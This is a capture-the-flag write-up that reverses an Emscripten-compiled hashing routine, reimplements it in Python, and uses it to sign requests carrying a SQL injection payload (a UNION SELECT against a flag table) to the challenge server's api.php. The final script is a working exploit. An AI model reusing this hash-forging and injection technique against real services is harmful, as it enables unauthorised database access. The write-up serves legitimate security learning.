# King of Glory

Zach Wade (@zwad3) Sam Kim (@ubuntor)

## A Bit of Reversing

In this web problem, we encounter a page with no obvious content (save a title). Upon further examination, we see that the page is looking for an `id` parameter and then calling a function on it to get a hash and timestamp. Given the only other included JavaScript is in the file `functionn.js`, it is reasonable to assume that this is where the hashing function lies.

Once we examine `functionn.js`, we immediately see that it is a compiled EMSCRIPTEN file, which means that it was originally native code that had been compiled to `js` via `llvm`. Fortunately for us, a quick examination of the code yields that the first of the EMSCRIPTEN-compiled functions is `__ZN5HASH14initEv`. This is a clear example of c++ function mangling, and so using a demangler we find that this function is `_HASH1::init()`. From there, we can search through and see that this function is called from `__ZN5HASH1C2ERKNSt3__112basic_stringIcNS0_11char_traitsIcEENS0_9allocatorIcEEEE` (`_HASH1::HASH1(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&)`), which is then called from `__Z3hi1NSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEE` (`_hi1(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> >)`). Finally, we see that this function, which upon inspection of the corresponding `update` and `finalize` functions appears to be an `md5` functino, is then called from the function `__Z10user_inputNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEE` (`_user_input(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> >)`). Given the name of this function, it is reasonable to assume that this is the main function for us to examine.

Now, when examining this code, we see a long mess of functions that seem to be creating and updating dynamic string objects on the fly. In order to get a better understanding of what this code does, we need to know a little bit about how emscripten's emulated environment looks like. Specifically, we need to know that the heap lives in a variable called `heap8`. To help us see what's happening, we will define a function called `printString` which lets us examine a string on the heap.

```js
printString = function(idx) {
	var zout = ""
	for (var i = idx; HEAP8[i] != 0; i++) {
		 zout += String.fromCharCode(HEAP8[i])
	}
	console.log(zout)
}
```

It will also be helpful to define a function to let us examine the contents a c++ `basic_string` type. In this case, the string object will live in a variable called `heap32`, and by trial and error, I found that the string itself is offset by 8 bytes. Furthermore, because this variable is a `32` bit representation, we must divide by 4 when indexing. Thus, we can print a basic string as

```js
printBString = function(idx) {
	printString(HEAP32[idx+8>>2])
}
```

Now that we have these handy debug statements, we can examine what is being created and changed all throughout this method. In the end, what we find is that it begins by taking the `md5` of `"Start_here_"`, then taking bytes 6-22 of the hex representation of that. Those are then prepended to the value being hashed, which is followed by the aptly-named salt, `"This_is_salt"`. The string is finally appended with the current time in seconds. Then, the value that is outputted is the `md5` of the above  string, postpended with the time and `"yo"`, delinineated by `|`. Thus, the the python implementation of this function ends up being

```python
import hashlib

def md5 (string):
    m = hashlib.md5()
    m.update(string)
    return m.hexdigest()

def run (val, time):
    intermed = md5("Start_here_")[6:16+6]
    string = intermed+val+" This_is_salt"+str(time)
    hash = md5(string)
    return hash+"|"+str(time)+"|yo"
```

In addition to this functionality, the executable also makes a few checks to ensure that the value being hashed is a numeral. However, now that we know what the hashing algorithm is, we can hash any value. 

## Transition to Web

Now that we have the hashing algorithm, we can look at what it does once it generates the hash. It sends it to  `/api.php` and passes in the original value and the hash and time. We notice that it throws an error if you provide an improper hash, but if you provide a proper hash and value less than 6, it will generate a name. Otherwise, if you hash and send a string, it generates a 500 error. From here, its not much a logical leap that the rest of the problem would be SQL injection. In fact, the injection is near trivial, as all the protection was done by the hashing algorithm. After poking around with the database contents, we find that we can use the following request to dump the flag

```python
import hashlib
import requests

def md5 (string):
    m = hashlib.md5()
    m.update(string)
    return m.hexdigest()

def run(val, time):
    intermed = md5("Start_here_")[6:16+6]
    string = intermed+val+" This_is_salt"+str(time)
    hash = md5(string)
    payload = {'id':val, 'hash':hash, 'time':time}
    return requests.get('http://202.120.7.213:11181/api.php',params=payload)

r = run("123 UNION ALL SELECT 0,hey FROM fl4g", "1489810337")
print(r.text)
```

Thus, we get `flag{emScripten_is_Cut3_right?}`, which indeed it is.
